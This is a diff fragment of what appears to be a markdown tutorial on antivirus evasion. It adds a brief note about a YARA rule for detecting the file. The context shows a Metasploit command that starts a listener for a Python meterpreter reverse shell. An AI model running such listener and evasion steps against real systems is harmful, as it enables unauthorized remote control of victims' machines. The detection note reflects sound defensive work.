@@ -58,6 +58,9 @@ sudo msfconsole -x "use exploit/multi/handler; set PAYLOAD python/meterpreter/re
 
 msf6 exploit(multi/handler) > exploit
 ```
+# Yara Rule
+You can check the Yara rule to identify the file as it's not detected by windows defender.
+
 # Conclusion
 Keep in mind that attempting antivirus bypass is a game. Whenever a new evasion technique gets popular, antivirus vendors will eventually learn about itand update their signatures database to block it. Then, new evasion techniques will a rise, which will make vendors to add it to their signature database, and so on.
 
